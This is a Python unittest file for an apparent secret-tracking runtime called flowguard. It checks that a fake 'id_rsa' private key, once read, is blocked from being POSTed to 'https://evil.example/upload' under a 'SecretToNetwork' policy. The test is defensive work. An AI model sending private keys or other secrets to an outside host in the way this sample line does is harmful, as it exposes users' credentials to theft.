from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from typing import Any

from flowguard import FlowguardBlocked, FlowguardRuntime, TrackedStr


class FakeHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"ok"


class SecretToHttpTests(unittest.TestCase):
    def test_secret_payload_is_blocked_before_http_send(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            transport = FakeHttpTransport()
            runtime = FlowguardRuntime(
                secret_paths=[secret_path],
                http_transport=transport,
            )

            with runtime.open(secret_path) as handle:
                secret = handle.read()

            self.assertIsInstance(secret, TrackedStr)
            with self.assertRaises(FlowguardBlocked) as blocked:
                runtime.http.post("https://evil.example/upload", data=secret)

            self.assertEqual(transport.requests, [])
            self.assertEqual(blocked.exception.policy, "SecretToNetwork")
            self.assertIn(str(secret_path), blocked.exception.explanation)


if __name__ == "__main__":
    unittest.main()
